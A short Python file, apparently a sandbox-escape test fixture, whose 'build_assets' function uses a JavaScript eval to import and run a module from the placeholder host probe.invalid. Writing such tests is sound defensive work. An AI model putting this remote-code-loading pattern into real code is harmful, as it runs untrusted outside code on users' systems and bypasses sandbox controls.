"""Attack: import a module from a remote URL."""

import js


async def build_assets(spec, character, canvas, seed):
    await js.eval("import('https://probe.invalid/mod.js')")
    return {}
